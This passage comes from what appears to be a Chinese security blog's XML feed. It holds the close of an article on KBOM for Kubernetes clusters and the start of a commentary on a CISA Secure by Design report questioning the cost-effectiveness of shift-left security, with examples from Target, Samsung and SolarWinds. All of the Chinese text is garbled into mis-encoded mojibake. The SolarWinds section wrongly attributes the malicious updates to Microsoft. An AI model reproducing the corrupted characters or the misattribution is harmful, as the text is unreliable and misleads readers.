å›¢é˜Ÿçš„æ·±å…¥äº¤æµï¼Œæˆ‘ä»¬æ„è¯†åˆ°äº† KBOM åœ¨éæŠ€æœ¯å±‚é¢çš„å±€é™æ€§ï¼Œå¹¶å¼€å§‹æ€è€ƒï¼šKBOM ç©¶ç«Ÿåº”è¯¥æ˜¯ä¸€ä¸ªæ ‡å‡†è¿˜æ˜¯ä»…ä»…åœç•™åœ¨æ¦‚å¿µå±‚é¢ï¼ŸKBOM æ˜¯å¦éœ€è¦ä¸€ä¸ªæ ‡å‡†ï¼Ÿ</p><h2 id="äº”ã€æ€»ç»“ä¸å±•æœ›"><a href="#äº”ã€æ€»ç»“ä¸å±•æœ›" class="headerlink" title="äº”ã€æ€»ç»“ä¸å±•æœ›"></a>äº”ã€æ€»ç»“ä¸å±•æœ›</h2><h3 id="ï¼ˆä¸€ï¼‰KBOM-çš„ä¼˜åŠ¿"><a href="#ï¼ˆä¸€ï¼‰KBOM-çš„ä¼˜åŠ¿" class="headerlink" title="ï¼ˆä¸€ï¼‰KBOM çš„ä¼˜åŠ¿"></a>ï¼ˆä¸€ï¼‰KBOM çš„ä¼˜åŠ¿</h3><p>æ¯«æ— ç–‘é—®ï¼ŒKBOM çš„åº”ç”¨ä¸ºé›†ç¾¤çš„é€æ˜åº¦æä¾›äº†ä¿éšœï¼Œä½¿å¾—å¯¹é›†ç¾¤å®‰å…¨é£é™©çš„å…¨é¢è¯„ä¼°å’Œå¿«é€Ÿåº”æ€¥å“åº”æˆä¸ºå¯èƒ½ã€‚</p><p>æ­¤å¤–ï¼ŒKBOM çš„ç”Ÿæˆæˆæœ¬ç›¸å¯¹è¾ƒä½ï¼Œä¸ SBOM ä¸åŒï¼Œå®ƒæ— éœ€éå†æ–‡ä»¶ç³»ç»Ÿæˆ–å¯¹é•œåƒå†…å®¹è¿›è¡Œåˆ†æï¼Œä¹Ÿä¸éœ€è¦ä¸å¤§é‡å¼€å‘è€…çš„å¤šæ ·åŒ–ç‰ˆæœ¬ç®¡ç†ç­–ç•¥ç›¸å…¼å®¹ã€‚KBOM çš„åˆ›å»ºä»…é€šè¿‡å‘ API Server å‘èµ· HTTP è¯·æ±‚å³å¯å®ç°ã€‚</p><p>åœ¨ä¸šåŠ¡ç¯å¢ƒä¸­ï¼ŒKBOM äº¦å…·å¤‡å¹¿æ³›çš„åº”ç”¨åœºæ™¯ï¼Œä¾‹å¦‚ï¼Œå¯ç”¨äºè·¨å›¢é˜Ÿå…±äº«é›†ç¾¤ä¿¡æ¯ï¼Œä»¥åŠå¯¹é›†ç¾¤ç»„ä»¶çš„æ¼æ´è¿›è¡Œå…¨é¢çš„å®‰å…¨è¯„ä¼°ã€‚</p><h3 id="ï¼ˆäºŒï¼‰KBOM-çš„ä¸è¶³"><a href="#ï¼ˆäºŒï¼‰KBOM-çš„ä¸è¶³" class="headerlink" title="ï¼ˆäºŒï¼‰KBOM çš„ä¸è¶³"></a>ï¼ˆäºŒï¼‰KBOM çš„ä¸è¶³</h3><p>ç„¶è€Œï¼Œæˆ‘ä»¬å¿…é¡»æ­£è§† KBOM æŠ€æœ¯å½“å‰å­˜åœ¨çš„ä¸€äº›å±€é™æ€§ã€‚</p><p>é¦–å…ˆï¼ŒKBOM ä½œä¸ºä¸€ä¸ªæ–°å…´æŠ€æœ¯ï¼Œå…¶æˆç†Ÿåº¦å°šæ˜¾ä¸è¶³ï¼Œç¼ºä¹ç»Ÿä¸€çš„ç®¡ç†è§„èŒƒå’Œæ•°æ®æ ¼å¼æ ‡å‡†ã€‚ä¾‹å¦‚ï¼Œåœ¨æ— ä»»ä½•å·¥ä½œè´Ÿè½½çš„å•ä¸ª Kubernetes é›†ç¾¤ä¸­ï¼ŒKSOC ç”Ÿæˆäº†è¶…è¿‡ 5,000 æ¡æ•°æ®è®°å½•ï¼Œè€Œ Trivy ä»…ç”Ÿæˆäº† 50 ä½™æ¡ã€‚åœ¨å¤„ç†å¤§è§„æ¨¡ Kubernetes é›†ç¾¤æ—¶ï¼Œç›´æ¥é€šè¿‡è®¿é—® API Server ç”Ÿæˆ KBOM å¯èƒ½ä¼šå¯¼è‡´é€Ÿåº¦æ˜¾è‘—ä¸‹é™ï¼Œå› æ­¤ï¼Œè€ƒè™‘ä»ç¼“å­˜ä¸­è¯»å–é›†ç¾¤ä¿¡æ¯ç­‰ä¼˜åŒ–ç­–ç•¥æ˜¯å¿…è¦çš„ã€‚</p><p>å…¶æ¬¡ï¼ŒKBOM ç¼ºä¹æ­£å¼çš„æ ‡å‡†ã€‚å°½ç®¡ SBOM çš„æ¦‚å¿µå·²æœ‰åå¹´å†å²ï¼Œå¹¶åœ¨ 2022 å¹´å·²è¢«çº³å…¥åˆè§„æ€§æ³•è§„æ–‡ä»¶ä¸­ï¼Œä½† KBOM å°šæœªè¢«ä»»ä½•æ­£å¼æ–‡ä»¶æ‰€é‡‡çº³ã€‚</p><p>æœ€åï¼ŒKBOM åœ¨ç¤¾åŒºæ”¯æŒå’Œå…¬å¼€èµ„æ–™æ–¹é¢ä¹Ÿå­˜åœ¨ä¸è¶³ã€‚ç”±äºå®£ä¼ æ¨å¹¿ä¸è¶³ï¼Œå¯¼è‡´ Aqua Security é‡å¤å¼€å±•äº†ç›¸ä¼¼çš„å·¥ä½œã€‚KBOM çš„ç”Ÿæ€ç³»ç»Ÿå’Œç¤¾åŒºå°šæœªå®Œå…¨å»ºç«‹ï¼Œå› æ­¤ï¼Œå°½ç®¡ KSOC æå‡ºäº†ç›¸å…³æ ‡å‡†ï¼Œä½†æ”¯æŒè¯¥æ ‡å‡†çš„å·¥å…·å’Œç”Ÿæ€å°šæœªå¾—åˆ°å……åˆ†å¼€å‘å’Œå®Œå–„ã€‚æ­¤å¤–ï¼Œå…³äº KBOM çš„ç ”ç©¶èµ„æ–™ç›¸å¯¹åŒ®ä¹ï¼Œç›®å‰å…¬å¼€å¯è·å–çš„èµ„æ–™ä¸­ï¼Œç¼ºä¹æ·±å…¥çš„åˆ†æå’Œè§£è¯»ã€‚</p><h3 id="ï¼ˆä¸‰ï¼‰æ€»ç»“-3"><a href="#ï¼ˆä¸‰ï¼‰æ€»ç»“-3" class="headerlink" title="ï¼ˆä¸‰ï¼‰æ€»ç»“"></a>ï¼ˆä¸‰ï¼‰æ€»ç»“</h3><p>æ­£å¦‚è®¸å¤šåœ¨å®éªŒå®¤ä¸­å­•è‚²çš„åˆ›æ–°æŠ€æœ¯ä¸€æ ·ï¼ŒKBOM è¦åœ¨å®é™…ä¸šåŠ¡ç¯å¢ƒä¸­å‘æŒ¥å…¶çœŸæ­£çš„æ½œåŠ›ï¼Œä¸ä»…éœ€è¦å¸å¼•æ›´å¤šæŠ€æœ¯äººå‘˜çš„å‚ä¸ç ”ç©¶ï¼Œè¿˜å¿…é¡»åœ¨æ›´åŠ å¤šå…ƒåŒ–çš„åº”ç”¨åœºæ™¯ä¸­è¿›è¡Œæµ‹è¯•åº”ç”¨ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨èƒ½åŠ›å’Œç¨³å®šæ€§ã€‚åŒæ—¶ï¼Œä¼ä¸šçš„é«˜å±‚ç®¡ç†è€…ä¹Ÿå¿…é¡»åœ¨ KBOM æ‰€æä¾›çš„å®‰å…¨ä¿éšœä¸æ‰€éœ€çš„æˆæœ¬æŠ•å…¥ä¹‹é—´æ‰¾åˆ°æ°å½“çš„å¹³è¡¡ç‚¹ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>äº‘åŸç”Ÿå®‰å…¨</tag>
      
      <tag>Kubernetes å®‰å…¨</tag>
      
      <tag>ä¾›åº”é“¾å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®¢æˆ·çœŸçš„æ³¨é‡å®‰å…¨å—ï¼Ÿå®‰å…¨å·¦ç§»çœŸçš„æœ‰æˆæœ¬æ•ˆç›Šå—ï¼Ÿ</title>
    <link href="/2025/01/16/%E5%AE%A2%E6%88%B7%E7%9C%9F%E7%9A%84%E6%B3%A8%E9%87%8D%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%E7%9C%9F%E7%9A%84%E6%9C%89%E6%88%90%E6%9C%AC%E6%95%88%E7%9B%8A%E5%90%97%EF%BC%9F/"/>
    <url>/2025/01/16/%E5%AE%A2%E6%88%B7%E7%9C%9F%E7%9A%84%E6%B3%A8%E9%87%8D%E5%AE%89%E5%85%A8%E5%90%97%EF%BC%9F%E5%AE%89%E5%85%A8%E5%B7%A6%E7%A7%BB%E7%9C%9F%E7%9A%84%E6%9C%89%E6%88%90%E6%9C%AC%E6%95%88%E7%9B%8A%E5%90%97%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>2024 å¹´ 11 æœˆ 28 æ—¥ï¼Œæˆ‘ä»¬è½¬å‘äº†å®‰å…¨å–µå–µç«™çš„ä¸€ç¯‡æ–‡ç« <a href="https://mp.weixin.qq.com/s/jbA61jO9tKPlUS3zdnarmg">ã€Šâ€œå®‰å…¨å·¦ç§»â€ï¼Œæˆ–è®¸æ²¡æœ‰æ„ä¹‰ã€‹</a>ã€‚è¿™ç¯‡æ–‡ç« çš„åˆ›ä½œçµæ„Ÿä¸»è¦æ¥è‡ªäº CISA äº 2024 å¹´ 10 æœˆ 11 æ—¥å‘å¸ƒçš„ä¸€ä»½æ”¿åºœæ€§æŠ¥å‘Šã€‚</p><p>CISA åœ¨è¿™ä»½æŠ¥å‘Šä¸­å¯¹â€œ<strong>å¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„ 100 å€æŒ‡æ ‡</strong>â€æå‡ºäº†è´¨ç–‘ï¼ŒæŠ¥å‘Šä¸€å‘å‡ºï¼Œäº’è”ç½‘ä¸Šæ€èµ·äº†ä¸€æ³¢å…³äºå°†å®‰å…¨ä»£ç è´£ä»»è½¬å«ç»™å¼€å‘äººå‘˜çš„äº‰è®ºã€‚</p><p>å…¶å®ï¼ŒæŠ¥å‘Šå¹¶ä¸åªæŒ‘æˆ˜äº†â€œå¼€å‘æ—©æœŸä¿®å¤è½¯ä»¶æ¼æ´åˆç†æ€§çš„ 100 å€æŒ‡æ ‡â€è¿™ä¸€å®‰å…¨é¢†åŸŸçš„åŸºæœ¬è§‚ç‚¹ï¼Œè¿˜é€šè¿‡åˆ†æå†å²é‡å¤§å®‰å…¨äº‹ä»¶è´¨ç–‘â€œ<strong>å®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—â€</strong>ã€‚</p><p><img src="/image/666.webp" alt="å›¾ 1ï¼šæˆ‘è®¤ä¸ºè¿™å¹¶ä¸æ˜¯å®‰å…¨é¢†åŸŸæ‰€æœŸæœ›çš„â€˜å·¦ç§»â€™ç­–ç•¥"></p><p>æŠ¥å‘Šç¯‡å¹…ä¸é•¿ï¼Œåªæœ‰ 3 é¡µå†…å®¹ï¼Œå´å¹²è´§æ»¡æ»¡ã€‚æ‰€ä»¥ï¼Œä»Šå¤©æˆ‘ä»¬é€šè¿‡è§£è¯»è¿™ä»½æŠ¥å‘Šæ¥é‡å¡‘æˆ‘ä»¬çš„å®‰å…¨å»ºè®¾è§‚å¿µã€‚æœ¬æ–‡ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p><ol><li>æŠ¥å‘Šå‘å¸ƒè€…ï¼ˆå®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼šï¼‰çš„åŸºæœ¬ä»‹ç»ã€‚</li><li>æŠ¥å‘Šå‘å¸ƒçš„èƒŒæ™¯ã€‚</li><li>æŠ¥å‘Šæ‰€æŒ‘æˆ˜çš„ä¸¤ä¸ªåŸºæœ¬è§‚å¿µï¼šå®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿä»¥åŠåœ¨å¼€å‘è¿‡ç¨‹ä¸­å°½æ—©å‘ç°å¹¶ä¿®å¤å®‰å…¨æ¼æ´çœŸçš„æ›´ç¬¦åˆæˆæœ¬æ•ˆç›Šå—ï¼Ÿ</li><li>æŠ¥å‘Šæœ€ç»ˆçš„æ€»ç»“åŠå»ºè®®ã€‚</li></ol><p>ä¸ºäº†æ·±åº¦è§£è¯»è¿™ç¯‡æŠ¥å‘Šå¹¶è¿›è¡Œæ¨å¹¿ï¼Œæˆ‘ä»¬åœ¨ä¿ç•™äº†æŠ¥å‘ŠåŸæœ¬è§‚ç‚¹çš„å‰æä¸‹è¿›è¡Œäº†è¯‘æ„ä¸æ¶¦è‰²ã€‚å®Œæ•´çš„æŠ¥å‘Šå†…å®¹ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘å³å¯è¿›è¡Œä¸‹è½½ã€‚</p><h2 id="0x01-å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š"><a href="#0x01-å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š" class="headerlink" title="0x01 å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š"></a>0x01 å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š</h2><p>æ•¢äºæŒ‘æˆ˜å®‰å…¨é¢†åŸŸçš„ä¸€äº›åŸºæœ¬è§‚ç‚¹ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æŠ¥å‘Šçš„å‘å¸ƒè€…ï¼Œå³å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼šåˆ°åº•æ˜¯ä½•æ–¹ç¥åœ£ï¼</p><p><a href="https://www.cisa.gov/securebydesign" title="å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š">å®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š</a>ï¼ˆSecure by Designï¼Œç®€ç§° SBDï¼‰ä½äº<a href="https://www.cisa.gov/" title="ç¾å›½ç½‘ç»œå®‰å…¨å’ŒåŸºç¡€è®¾æ–½å®‰å…¨å±€">ç¾å›½ç½‘ç»œå®‰å…¨å’ŒåŸºç¡€è®¾æ–½å®‰å…¨å±€</a>ï¼ˆCybersecurity and Infrastructure Security Agencyï¼Œç®€ç§° CISAï¼‰ä¹‹ä¸‹çš„<a href="https://www.cisa.gov/resources-tools/groups/cisa-cybersecurity-advisory-committee" title="ç½‘ç»œå®‰å…¨å’¨è¯¢å§”å‘˜ä¼š">ç½‘ç»œå®‰å…¨å’¨è¯¢å§”å‘˜ä¼š</a>ï¼ˆCybersecurity Advisory Committeeï¼Œç®€ç§° CSACï¼‰ï¼Œä¸»è¦è´Ÿè´£ç ”ç©¶å¯èƒ½é˜»ç¢é‡‡ç”¨å®‰å…¨è®¾è®¡åŸåˆ™çš„ç»æµéšœç¢ï¼Œä¸‹æ–‡ç®€ç§° SBDã€‚</p><p><img src="/image/667.png" alt="å›¾ 2ï¼šå®‰å…¨è®¾è®¡å°ç»„å§”å‘˜ä¼š"></p><p>SBD çš„è®¾ç«‹çš„åˆè¡·ä»¥åŠä¸»è¦çš„ä»»åŠ¡ä¸ºï¼š</p><ol><li>ä¸º CSAC çš„å®¡è®®å’ŒæŠ•ç¥¨æä¾›å»ºè®®ï¼Œä»¥å®¡æŸ¥ CISA å¦‚ä½•é¼“åŠ±æŒä¹…æ€§å’Œç³»ç»Ÿæ€§çš„è¡ŒåŠ¨æ¥é™ä½å›½å®¶å®‰å…¨é£é™©ï¼›</li><li>ç ”ç©¶å’Œåº”å¯¹å¯¼è‡´å½“å‰é£é™©çŠ¶æ€çš„ç»æµå› ç´ ï¼›</li><li>ç ”ç©¶å†æ¥é™åˆ¶å®‰å…¨è½¯ä»¶å’Œç¡¬ä»¶åˆ¶é€ çš„ä¾›æ±‚å› ç´ ã€‚</li></ol><p>æ€»çš„æ¥è¯´ï¼ŒSBD éœ€è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li><strong>å“ªäº›æ¿€åŠ±å› ç´ å’Œç»æµåŠ›é‡ä¼šä¿ƒè¿›æˆ–é˜»ç¢è½¯ä»¶åˆ¶é€ å•†é‡‡ç”¨å®‰å…¨è®¾è®¡åšæ³•ï¼ŸCISA å¦‚ä½•è°ƒæ•´è¿™äº›å› ç´ ï¼Œä»¥é¼“åŠ±è½¯ä»¶åˆ¶é€ å•†å¼€å‘æ›´å®‰å…¨çš„è½¯ä»¶ï¼Ÿ</strong></li><li>å¦‚æœæ¯ä¸ªä¼ä¸šå’Œæ¶ˆè´¹è€…éƒ½æŠŠç½‘ç»œå®‰å…¨ä½œä¸ºè½¯ä»¶è´­ä¹°çš„é¦–è¦æ ‡å‡†ï¼Œä¸å®‰å…¨è½¯ä»¶çš„é—®é¢˜å°±ä¼šå¼€å§‹è‡ªè¡Œè§£å†³ã€‚ä½†<strong>CISA å¦‚ä½•èƒ½å¤Ÿåœ¨é‡‡è´­è¿‡ç¨‹ä¸­å½¢æˆâ€œæŒ‰éœ€å®‰å…¨â€çš„è§„èŒƒï¼Ÿæ­¤å¤–ï¼Œè¿™æ ·çš„è§„èŒƒå¦‚ä½•å¸®åŠ©å®¢æˆ·è¦æ±‚å¢åŠ æ”»å‡»æˆæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œè€Œä¸æ˜¯æ»¡è¶³äºé‚£äº›ä»…ä»…æ— æ•ˆçš„ã€ä½œä¸ºå¤é€‰æ¡†å­˜åœ¨çš„å®‰å…¨åŠŸèƒ½ï¼Ÿ</strong></li></ol><h2 id="0x02-æŠ¥å‘Šå‘å¸ƒçš„èƒŒæ™¯"><a href="#0x02-æŠ¥å‘Šå‘å¸ƒçš„èƒŒæ™¯" class="headerlink" title="0x02 æŠ¥å‘Šå‘å¸ƒçš„èƒŒæ™¯"></a>0x02 æŠ¥å‘Šå‘å¸ƒçš„èƒŒæ™¯</h2><p>åœ¨è¿‡å»çš„ä¸¤å¹´é‡Œï¼ŒCISA é€šè¿‡â€œå®‰å…¨è®¾è®¡â€ï¼ˆSecure by Designï¼‰è®¡åˆ’æˆåŠŸåœ°æé«˜äº†ç½‘ç»œå®‰å…¨æ ‡å‡†ã€‚ä¸è¶…è¿‡ 17 ä¸ªå›½å†…å¤–çš„åˆä½œä¼™ä¼´åˆä½œï¼Œå‘å¸ƒäº†å…³äºä¿æŠ¤ç¾å›½å…å—æ—¥ç›Šå˜åŒ–çš„ç½‘ç»œå¨èƒæ‰€éœ€çš„å…³é”®å®‰å…¨åŸåˆ™çš„æ˜ç¡®æŒ‡å¯¼ã€‚å¦‚ä»Šï¼Œå·²æœ‰è¶…è¿‡ 200 å®¶è½¯ä»¶åˆ¶é€ å•†è¡¨ç¤ºæ”¯æŒï¼Œå¹¶è¡¨ç¤ºåœ¨å®æ–½â€œå®‰å…¨è®¾è®¡â€åŸåˆ™æ–¹é¢å–å¾—äº†å¯è¡¡é‡çš„è¿›å±•ã€‚</p><p>CISA ç›®å‰å·²æˆåŠŸåœ°æé«˜äº†äººä»¬å¯¹â€œå®‰å…¨è®¾è®¡â€åŸåˆ™çš„è®¤è¯†ï¼Œæ‰€ä»¥å…¶ä¸‹ä¸€æ­¥è®¡åˆ’æ˜¯é¼“åŠ±â€œå®‰å…¨è®¾è®¡â€çš„å¹¿æ³›é‡‡ç”¨ã€‚</p><p><img src="/image/668.png" alt="å›¾ 3ï¼šä»»ä½•é€Ÿåº¦éƒ½ä¸å®‰å…¨ï¼šCISA ä¿ƒè¿›ç§‘æŠ€ç”Ÿæ€ç³»ç»Ÿå®‰å…¨çš„è®¡åˆ’"></p><p>åœ¨è¿‡å»çš„å…­ä¸ªæœˆé‡Œï¼ŒSBD ä¸€ç›´ä¸“æ³¨äºç¡®å®šä¸€ç³»åˆ—å»ºè®®ï¼Œä»¥ä½¿ CISA åœ¨â€œå®‰å…¨è®¾è®¡â€åŸåˆ™çš„å¹¿æ³›é‡‡ç”¨æ–¹é¢å–å¾—å¯è¡¡é‡çš„è¿›å±•ã€‚</p><p>SBD ä¸ä»…ä¸å…¬å…±éƒ¨é—¨å’Œç§è¥è¡Œä¸šè¿›è¡Œäº†äº¤æµï¼Œä»¥æ”¶é›†è§è§£å’Œæƒ³æ³•ï¼Œä¿ƒè¿›è¿™äº›åŸåˆ™çš„é‡‡ç”¨ã€‚è¿˜ä¸å­¦è€…ã€é¢†åŸŸä¸“å®¶ã€CISA çš„æ³•å¾‹å›¢é˜Ÿä»¥åŠ CISA çš„è®¤è¯å›¢é˜Ÿè¿›è¡Œäº†ä¼šé¢ï¼Œä»¥äº†è§£æ˜¯ä»€ä¹ˆæ¿€åŠ±ç»„ç»‡å®æ–½æ›´å¥½çš„å®‰å…¨æªæ–½ã€‚</p><p><strong>å¯æ˜¯ SBD ä¸ä½†æ²¡æœ‰å¾—å‡ºä¸€äº›é¢„æœŸä¹‹å†…çš„ç ”ç©¶æˆæœï¼Œåè€ŒæŒ‘æˆ˜äº†å®‰å…¨é¢†åŸŸçš„ä¸€äº›é•¿æœŸæŒæœ‰çš„åŸºæœ¬è§‚ç‚¹ã€‚ä¸»è¦åŸå› ä¸ºï¼šè¿™äº›è§‚ç‚¹å¹¶æ²¡æœ‰ç¡®å‡¿çš„è¯æ®æ”¯æ’‘ã€‚</strong></p><h2 id="0x03-è§‚ç‚¹-1ï¼šå®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿ"><a href="#0x03-è§‚ç‚¹-1ï¼šå®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿ" class="headerlink" title="0x03 è§‚ç‚¹ 1ï¼šå®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿ"></a>0x03 è§‚ç‚¹ 1ï¼šå®‰å…¨ç¼ºé™·çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿ</h2><h3 id="3-1-å†å²é‡å¤§å®‰å…¨äº‹ä»¶"><a href="#3-1-å†å²é‡å¤§å®‰å…¨äº‹ä»¶" class="headerlink" title="3.1 å†å²é‡å¤§å®‰å…¨äº‹ä»¶"></a>3.1 å†å²é‡å¤§å®‰å…¨äº‹ä»¶</h3><p>å®‰å…¨çœŸçš„ä¼šè®©å®¢æˆ·æ”¾å¼ƒäº§å“æˆ–æœåŠ¡å—ï¼Ÿå¯ç°å®æ˜¯ï¼š<strong>è®¸å¤šç»å†è¿‡å†å²é‡å¤§å®‰å…¨äº‹ä»¶çš„å…¬å¸è‡³ä»Šä»ç„¶æ­£å¸¸è¿è¥ï¼Œä¸”é€šå¸¸æƒ…å†µä¸‹ï¼Œè´¨é‡é—®é¢˜ä¼¼ä¹å¹¶ä¸æ€»æ˜¯å½±å“ç€å®¢æˆ·å¿ è¯šåº¦ã€‚</strong></p><p>2013 å¹´ï¼ŒTarget æ•°æ®æ³„éœ²äº‹ä»¶è¢«è®¤ä¸ºæ˜¯å†å²ä¸Šæœ€å¤§çš„å®‰å…¨æ³„éœ²äº‹ä»¶ä¹‹ä¸€ã€‚ç”±äºç¼ºä¹ç½‘ç»œéš”ç¦»ï¼Œæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨ç¬¬ä¸‰æ–¹é—¨æˆ·è¿›å…¥ Target ç½‘ç»œå¹¶çªƒå– 4000 ä¸‡æ¡ä¿¡ç”¨å¡å’Œå€Ÿè®°å¡è®°å½•ã€‚åä¸€å¹´åï¼ŒTarget è¿˜è¢«è®¤ä¸ºæ˜¯ç¾å›½åå¤§é›¶å”®å•†ä¹‹ä¸€ã€‚</p><p><img src="/image/669.png" alt="å›¾ 4:2013 å¹´ Target æ•°æ®æ³„éœ²äº‹ä»¶"></p><p>2016 å¹´ï¼Œä¸‰æ˜Ÿè¢«è¿«å®£å¸ƒå¬å›å”®ä»· 800 å¤šç¾å…ƒçš„ä¸‰æ˜Ÿ Galaxy Note 7 è®¾å¤‡ï¼Œå› ä¸ºæœ‰å¤§é‡æŠ¥å‘Šç§°è¿™æ¬¾æ‰‹æœºèµ·ç«äº†ã€‚å½“æ—¶çš„æŠ¥é“ä¼°è®¡ï¼Œè¿™ â€œ<a href="https://www.reuters.com/article/us-samsung-elec-smartphones-costs-idUSKCN12B0FX/" title="å¯èƒ½ä¼šåœ¨ä¸‰æ˜Ÿè´¦æˆ·ä¸Šçƒ§æ‰ 170 äº¿ç¾å…ƒçš„çªŸçª¿">å¯èƒ½ä¼šåœ¨ä¸‰æ˜Ÿè´¦æˆ·ä¸Šçƒ§æ‰ 170 äº¿ç¾å…ƒçš„çªŸçª¿</a>â€œã€‚å…«å¹´åï¼Œä¸‰æ˜Ÿä»åœ¨ç”Ÿäº§æ™ºèƒ½æ‰‹æœºï¼Œå¹¶è¢«è®¤ä¸ºæ˜¯å…¨çƒäº”å¤§æ™ºèƒ½æ‰‹æœºåˆ¶é€ å•†ä¹‹ä¸€ã€‚</p><p><img src="/image/670.png" alt="å›¾ 5ï¼šNote 7 æƒ¨è´¥å¯èƒ½è®©ä¸‰æ˜Ÿè´¦æˆ·æŸå¤± 170 äº¿ç¾å…ƒ"></p><p>2020 å¹´ï¼ŒSolarWinds ç½‘ç»œæ”»å‡»è¢«ç§°ä¸º â€œä¸–ç•Œä¸Šæœ‰å²ä»¥æ¥æœ€å¤§ã€æœ€å¤æ‚çš„æ”»å‡»â€ã€‚è¿‘ 18,000 å®¶å…¬å…±å’Œç§è¥æœºæ„å—åˆ°å¾®è½¯åˆ†å‘çš„æ¶æ„è½¯ä»¶æ„ŸæŸ“æ›´æ–°çš„å½±å“ã€‚<a href="https://www.sec.gov/Archives/edgar/data/1739942/000162828020017451/swi-20201214.htm" title="åœ¨ 2020 å¹´ 12 æœˆå‘ç°æ”»å‡»æ—¶ï¼ŒSolarWinds æŠ¥å‘Šæœ‰ 30 å¤šä¸‡å®¢æˆ·">åœ¨ 2020 å¹´ 12 æœˆå‘ç°æ”»å‡»æ—¶ï¼ŒSolarWinds æŠ¥å‘Šæœ‰ 30 å¤šä¸‡å®¢æˆ·</a>ã€‚å››å¹´åçš„ä»Šå¤©ï¼ŒSolarWinds ä¾ç„¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»æ‹¥æœ‰ 30 å¤šä¸‡å®¢æˆ·ã€‚</p><p><img src="/image/671.png" alt="å›¾ 6:2020 å¹´ SolarWinds ç½‘ç»œæ”»å‡»äº‹ä»¶"></p><h3 id="3-2-ä¸ä¿®å¤æ¼æ´ä¼šå½±å“åˆ°ä¸šåŠ¡ä¸è¶³ä»¥è¾¾åˆ°æ¿€åŠ±ä½œç”¨"><a href="#3-2-ä¸ä¿®å¤æ¼æ´ä¼šå½±å“åˆ°ä¸šåŠ¡ä¸è¶³ä»¥è¾¾åˆ°æ¿€åŠ±ä½œç”¨" class="headerlink" title="3.2 ä¸ä¿®å¤æ¼æ´ä¼šå½±å“åˆ°ä¸šåŠ¡ä¸è¶³ä»¥è¾¾åˆ°æ¿€åŠ±ä½œç”¨"></a>3.2 ä¸ä¿®å¤æ¼æ´ä¼šå½±å“åˆ°ä¸šåŠ¡ä¸è¶³ä»¥è¾¾åˆ°æ¿€åŠ±ä½œç”¨</h3><p>å› æ­¤ï¼Œä»…ä»…å‘Šè¯‰ç»„ç»‡ï¼Œå¦‚æœä¸ä¿®å¤å®‰å…¨æ¼æ´å°†ä¼šå½±å“åˆ°ä¸šåŠ¡ï¼Œå¹¶ä¸è¶³ä»¥è¾¾åˆ°æ¿€åŠ±çš„ä½œç”¨ã€‚å› ä¸ºï¼Œåœ¨å¤§è§„æ¨¡çš„å®‰å…¨äº‹ä»¶å‘ç”Ÿè¿‡åï¼Œå·²æœ‰å®¢æˆ·è¿˜ä¼šå—åˆ°ä»¥ä¸‹å› ç´ çš„å½±å“ï¼š</p><ul><li><strong>è½¬ç”¨å…¶ä»–å“ç‰Œçš„æ½œåœ¨æˆæœ¬ï¼›</strong></li><li><strong>å®¢æˆ·æ„¿æ„èŠ±å¤šå°‘ç²¾åŠ›å»äº†è§£å®‰å…¨äº‹ä»¶çš„å½±å“ï¼›</strong></li><li><strong>å‘ç”Ÿå®‰å…¨äº‹ä»¶çš„å…¬å¸å…³äºåº”å¯¹æªæ–½çš„è¥é”€ä¿¡æ¯çš„æœ‰æ•ˆæ€§ã€‚</strong></li></ul><p>æ­¤å¤–ï¼Œå®¢æˆ·é€šå¸¸ä¼šè¯´æœè‡ªå·±ï¼šåœ¨å‘ç”Ÿå®‰å…¨äº‹ä»¶åï¼Œæ— è®ºæ˜¯å¦åšå‡ºå®é™…æ”¹å˜ï¼Œå…¬å¸éƒ½ä¼šè‡ªç„¶è€Œç„¶åœ°é‡‡å–æ›´å¤šæªæ–½æ¥æ”¹å–„å®‰å…¨çŠ¶å†µã€‚</p><p>å¹¶ä¸”ï¼Œç›®å‰è¿˜ä¸æ¸…æ¥šè¿™äº›å› ç´ æ˜¯å¦ä¼šå½±å“åˆ°æ–°çš„æ½œåœ¨å®¢æˆ·ã€‚</p><h2 